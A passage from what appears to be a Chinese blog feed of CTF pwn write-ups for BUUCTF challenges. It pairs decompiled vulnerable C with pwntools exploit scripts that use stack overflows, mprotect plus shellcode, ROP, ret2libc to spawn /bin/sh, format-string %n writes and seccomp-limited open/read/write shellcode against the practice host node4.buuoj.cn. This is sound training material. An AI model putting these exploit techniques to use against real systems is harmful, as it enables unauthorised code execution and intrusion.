<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4[<span class="number">45</span>]; <span class="comment">// [esp+Fh] [ebp-2Dh] BYREF</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;b0r4 v3r s3 7u 4h o b1ch4o m3m0... &quot;</span>);</span><br><span class="line">  gets(v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">get_secret</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// esi</span></span><br><span class="line">  v0 = fopen(<span class="string">&quot;flag.txt&quot;</span>, &amp;unk_80CF91B);</span><br><span class="line">  fgets(&amp;fl4g, <span class="number">45</span>, v0);</span><br><span class="line">  <span class="keyword">return</span> fclose(v0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过main函数的栈溢出，调用get_secret函数，然后把结果打印出来应该就可以getflag了，但这里本地可行，远程不行，远程需要mprotect修改权限执行shellcode。</p>
<p>本地payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">\<span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29143</span>)</span><br><span class="line"></span><br><span class="line">get_secret_addr = <span class="number">0x080489A0</span></span><br><span class="line"></span><br><span class="line">fl4g_addr = <span class="number">0x080ECA2D</span></span><br><span class="line"></span><br><span class="line">printf_addr = <span class="number">0x0804F0A0</span></span><br><span class="line"></span><br><span class="line">\<span class="comment">#p.recvline()  加了这一行就卡住了，不明原因</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x2D</span>) + p32(get_secret_addr) + p32(printf_addr) + <span class="string">&#x27;aaaa&#x27;</span> + p32(fl4g_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(p.recv())</span><br></pre></td></tr></table></figure>

<p>远程payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28525</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">mprotect_addr = elf.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line"></span><br><span class="line">mem_addr = <span class="number">0x080EB000</span>     <span class="comment">#.got.plt的起始段，有声明了一段代码，可写</span></span><br><span class="line"></span><br><span class="line">mem_size = <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">mem_pow = <span class="number">0x7</span></span><br><span class="line"></span><br><span class="line">\<span class="comment">#0x0809e3e5 : pop ebp ; pop esi ; pop edi ; ret</span></span><br><span class="line"></span><br><span class="line">pop_third_addr = <span class="number">0x0809e3e5</span></span><br><span class="line"></span><br><span class="line">read_addr = elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x2d</span> + p32(mprotect_addr) + p32(pop_third_addr) + p32(mem_addr) + p32(mem_size) + p32(mem_pow) </span><br><span class="line"></span><br><span class="line">payload += p32(read_addr) + p32(mem_addr) + p32(<span class="number">0</span>) + p32(mem_addr) + p32(mem_size) </span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())     <span class="comment">#生成shellcode</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/not_the_same_3dsctf_2016/not_the_same_3dsctf_2016(2).png"></p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>32bit</tag>
        <tag>shellcode</tag>
        <tag>mprotect修改权限</tag>
      </tags>
  </entry>
  <entry>
    <title>picoctf_2018_rop</title>
    <url>/picoctf_2018_rop/</url>
    <content><![CDATA[<h2 id="picoctf-2018-rop"><a href="#picoctf-2018-rop" class="headerlink" title="picoctf_2018_rop"></a>picoctf_2018_rop</h2><p><img src="/picoctf_2018_rop/1.jpg"></p>
<p>根据题目提示，应该使用ROP，但查看了一下文件，ret2libc应该也是可行的。</p>
<p>重要代码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">__gid_t</span> v4; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v4 = getegid();</span><br><span class="line">  setresgid(v4, v4, v4);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *<span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">24</span>]; <span class="comment">// [esp+0h] [ebp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter your input&gt; &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> gets(s);             <span class="comment">//存在溢出点，且溢出长度很长</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">win_function1</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  win1 = <span class="number">1</span>;     <span class="comment">//设置win1的值</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">win_function2</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  result = (<span class="type">unsigned</span> __int8)win1;</span><br><span class="line">  <span class="keyword">if</span> ( win1 &amp;&amp; a1 == <span class="number">-1163220307</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    win2 = <span class="number">1</span>;      <span class="comment">//设置win2的值</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( win1 )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">&quot;Wrong Argument. Try Again.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">&quot;Nope. Try a little bit harder.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">flag</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">48</span>]; <span class="comment">// [esp+Ch] [ebp-3Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+3Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(</span><br><span class="line">      <span class="string">&quot;Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">48</span>, stream);</span><br><span class="line">  <span class="keyword">if</span> ( win1 &amp;&amp; win2 &amp;&amp; a1 == <span class="number">-559039827</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">  <span class="keyword">if</span> ( win1 &amp;&amp; win2 )        <span class="comment">//两个值要相等，不然没法进来</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Incorrect Argument. Remember, you can call other functions in between each win function!&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( win1 || win2 )        <span class="comment">//只要有一个非0即可</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Nice Try! You&#x27;re Getting There!&quot;</span>);     <span class="comment">//把程序执行到这里就可以getflag了，但不知道它是从哪里调用的</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;You won&#x27;t get the flag that easy..&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据程序结构，构造payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;i386&quot;</span>, log_level= <span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">29055</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line"></span><br><span class="line">win_function1 = <span class="number">0x080485CB</span></span><br><span class="line">win_function2 = <span class="number">0x080485D8</span></span><br><span class="line">flag = <span class="number">0x0804862B</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">0x1c</span></span><br><span class="line">payload += p32(win_function1)</span><br><span class="line">payload += p32(win_function2) + p32(flag) + p32(<span class="number">0xBAAAAAAD</span>) + p32(<span class="number">0xDEADBAAD</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;input&gt; &quot;</span>, payload)     <span class="comment">#0xBAAAAAADDEADBAAD</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>获取负数的十六进制的方式如下：</p>
<img src="picoctf_2018_rop/2.jpg" style="zoom:67%;" />

<p>hex(-559039827&amp;0xFFFFFFFF)</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>32bit</tag>
        <tag>覆盖修改值</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn2_sctf_2016</title>
    <url>/pwn2_sctf_2016/</url>
    <content><![CDATA[<h1 id="pwn2-sctf-2016"><a href="#pwn2-sctf-2016" class="headerlink" title="pwn2_sctf_2016"></a>pwn2_sctf_2016</h1><p>整数溢出 + libc</p>
<p><img src="/pwn2_sctf_2016/pwn2_sctf_2016(1).png"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> vuln();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> nptr[<span class="number">32</span>]; <span class="comment">// [esp+1Ch] [ebp-2Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp+3Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;How many bytes do you want me to read? &quot;</span>);</span><br><span class="line"></span><br><span class="line">  get_n(nptr, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">  v2 = atoi(nptr);       <span class="comment">//字符串转数值</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt; <span class="number">32</span> )         <span class="comment">//不能大于32，如果不饶过则无法溢出，可以使用-1</span></span><br><span class="line"></span><br><span class="line">​    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;No! That size (%d) is too large!\n&quot;</span>, v2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Ok, sounds good. Give me %u bytes of data!\n&quot;</span>, v2);</span><br><span class="line"></span><br><span class="line">  get_n(nptr, v2);      <span class="comment">//v2视为无符号整型，则可以溢出，在这里溢出打印printf的地址</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;You said: %s\n&quot;</span>, nptr);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意第7行的输入函数不是get，是程序自定义的函数get_n,<br>接受a2个长度的字符串并放到vuln函数的缓冲区内部，但是a2传入的值类型是unsigned int，而前面判断长度的类型是int，可以规避长度限制。也就是说我们这边可以输入负数来达到溢出的效果（整数溢出）</p>
<p><img src="/pwn2_sctf_2016/pwn2_sctf_2016(2).png"></p>
<p>构造payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding = utf8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">\<span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28797</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;read? &#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">start_addr = elf.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x2C</span>+<span class="number">4</span>) + p32(printf_plt) + p32(start_addr) + p32(printf_got)    //printf和puts都是只有一个参数，write有<span class="number">3</span>个</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;data!\n&#x27;</span>) </span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;#####&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">printf_addr=u32(p.recv(<span class="number">4</span>))           <span class="comment">#在回车后读取4个字节，</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;printf_addr:&#x27;</span> + <span class="built_in">hex</span>(printf_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;printf&#x27;</span>,printf_addr)</span><br><span class="line"></span><br><span class="line">basic_addr = printf_addr - libc.dump(<span class="string">&#x27;printf&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_addr = basic_addr + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">str_bin_sh_addr = basic_addr + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret_addr = <span class="number">0x08048346</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;read? &#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x2C</span>+<span class="number">4</span>) + p32(ret_addr) + p32(system_addr) + <span class="string">&#x27;aaaa&#x27;</span> + p32(str_bin_sh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>ret2libc</tag>
        <tag>32bit</tag>
        <tag>整数溢出</tag>
      </tags>
  </entry>
  <entry>
    <title>ciscn_2019_es_2</title>
    <url>/PWN5/</url>
    <content><![CDATA[<h1 id="PWN5"><a href="#PWN5" class="headerlink" title="PWN5"></a>PWN5</h1><p>格式化字符串漏洞导致栈的读栈上的值并修改bss段的值覆盖随机值</p>
<p><a href="https://blog.csdn.net/BangSen1/article/details/115191602">https://blog.csdn.net/BangSen1/article/details/115191602</a></p>
<p><a href="https://blog.csdn.net/mcmuyanga/article/details/108253515">https://blog.csdn.net/mcmuyanga/article/details/108253515</a></p>
<p>拿到文件，使用checksec进行测试，得到如下结果，为32位，开启了栈溢出保护和栈执行保护</p>
<p><img src="/PWN5/PWN5(1).png"></p>
<p>使用IDA打开查看main函数，代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [esp+0h] [ebp-84h]</span></span><br><span class="line">  <span class="type">char</span> nptr[<span class="number">16</span>]; <span class="comment">// [esp+4h] [ebp-80h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">100</span>]; <span class="comment">// [esp+14h] [ebp-70h] BYREF      //输入区，局部变量，存放到栈中，可以利用printf的格式化漏洞来读栈</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [esp+78h] [ebp-Ch]</span></span><br><span class="line">  <span class="type">int</span> *v7; <span class="comment">// [esp+7Ch] [ebp-8h]</span></span><br><span class="line">  </span><br><span class="line">  v7 = &amp;a1;</span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v1 = time(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  srand(v1);</span><br><span class="line"></span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);    <span class="comment">//随机化种子</span></span><br><span class="line">  read(fd, &amp;dword_804C044, <span class="number">4u</span>);    <span class="comment">//写入随机数到dword_804C044中</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;your name:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x63</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello,&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;your passwd:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, nptr, <span class="number">0xF</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( atoi(nptr) == dword_804C044 )    <span class="comment">//将nptr字符串转为int值，并且判断是否与随机值相同，</span></span><br><span class="line">  &#123;</span><br><span class="line">​    <span class="built_in">puts</span>(<span class="string">&quot;ok!!&quot;</span>);</span><br><span class="line">​    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">​    <span class="built_in">puts</span>(<span class="string">&quot;fail&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( __readgsdword(<span class="number">0x14</span>u) != v6 )</span><br><span class="line">​    sub_80493D0();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>注意，该类格式化漏洞是由scanf和printf组合出来的，即scanf的内容就是printf的内容，这样我们就可以控制输入的内容，操作printf的参数。</p>
<p>有关格式化漏洞<a href="https://blog.csdn.net/qq_43394612/article/details/84900668">https://blog.csdn.net/qq_43394612/article/details/84900668</a></p>
<p>可以使用使用printf的 %08x来以8个16进制的长度打印栈的内容（栈的长度对应32位，4个字节，8个16进制数字），这个读取是低地址到高地址的读，例如这里的scanf是输入到一个数组，而printf则从这个数组的首地址开始读，前面会有部分的填充，但只要使用足够多的%08x就能读到输入内容的地方。</p>
<p><img src="/PWN5/PWN5(2).png"></p>
<p>使用AAAA %08x %08x %8x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x 去测量，空格作为分隔符。AAAA的ASCII码就是414141，而41414141在第10个（1开始）偏移量为10。</p>
<p>使用%n来写入到bss段，覆盖随机值，这里使用dd双字来声明，也就是双字，4个字节。</p>
<p><img src="/PWN5/PWN5(3).png"></p>
<p>构造payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding = utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;local:1/remote:2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">select = <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> select == <span class="number">2</span>:</span><br><span class="line"></span><br><span class="line">​    p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26980</span>)</span><br><span class="line"></span><br><span class="line">payload=p32(<span class="number">0x804c044</span>)+p32(<span class="number">0x804c045</span>)+p32(<span class="number">0x804c046</span>)+p32(<span class="number">0x804c047</span>)    //%n默认写入的是<span class="number">4</span>个字节，因此需要<span class="number">4</span>个地址    </span><br><span class="line"></span><br><span class="line">payload+=<span class="string">&#x27;%10$n%11$n%12$n%13$n&#x27;</span>     //%&lt;偏移&gt;$n  用于写入到前面地址的内容</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x10101010</span>))       //也就是十进制的<span class="number">269488144</span>，它是把写入的内容连起来。</span><br><span class="line"></span><br><span class="line">//这里输入<span class="number">4</span>个<span class="number">0x10</span>是因为我们payload的地址部分，不是格式化打印部分写入了<span class="number">16</span>长度的内容，一个p32函数转了<span class="number">4</span>个字符的地址</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>payload2，这次只通过%n一次性输入4个字节把dd的四个字节全部覆盖了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26980</span>)</span><br><span class="line"></span><br><span class="line">unk_804C044_addr=<span class="number">0x0804C044</span></span><br><span class="line"></span><br><span class="line">payload=p32(unk_804C044_addr)+<span class="string">&#x27;%10$n&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<p>总结本题的思路，首先是通过%08x这种方式打印，找到输出字符的偏移量，然后找出随机值的bss段地址，使用%xx$n赋值到该段地址中，然后输入与%n相对应的值，得到shell，在根目录上找到flag。</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>32bit</tag>
        <tag>写bss</tag>
        <tag>格式化字符串漏</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable_orw</title>
    <url>/pwnable_orw/</url>
    <content><![CDATA[<h2 id="pwnable-orw"><a href="#pwnable-orw" class="headerlink" title="pwnable_orw"></a>pwnable_orw</h2><p><a href="https://blog.csdn.net/mcmuyanga/article/details/109564279">https://blog.csdn.net/mcmuyanga/article/details/109564279</a></p>
<p><a href="https://blog.csdn.net/qq_44768749/article/details/108256099">https://blog.csdn.net/qq_44768749/article/details/108256099</a></p>
<p><img src="/pwnable_orw/1.jpg"></p>
<p>开启了栈保护，但可以执行shellcode，查看字符串没有发现&#x2F;bin&#x2F;sh</p>
<p>关键代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  orw_seccomp();           <span class="comment">//类似沙盒机制，可以用seccomp-tools工具来检查什么函数可用</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Give my your shellcode:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;shellcode, <span class="number">0xC8</span>u);</span><br><span class="line">  ((<span class="type">void</span> (*)(<span class="type">void</span>))shellcode)();    <span class="comment">//我们写入汇编代码就可以执行，例如shellcode，但是有沙盒</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">orw_seccomp</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int16 v1; <span class="comment">// [esp+4h] [ebp-84h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *v2; <span class="comment">// [esp+8h] [ebp-80h]</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">96</span>]; <span class="comment">// [esp+Ch] [ebp-7Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [esp+6Ch] [ebp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  qmemcpy(v3, &amp;unk_8048640, <span class="keyword">sizeof</span>(v3));</span><br><span class="line">  v1 = <span class="number">12</span>;</span><br><span class="line">  v2 = v3;</span><br><span class="line">  prctl(<span class="number">38</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  prctl(<span class="number">22</span>, <span class="number">2</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><img src="/pwnable_orw/2.jpg"></p>
<p>可见，有open、read、write函数可用，可以尝试用来读取flag文件并打印出来</p>
<p>构造padload1</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28528</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="string">&#x27;eax&#x27;</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">100</span>)</span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line"></span><br><span class="line">r.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>构造payload2</p>
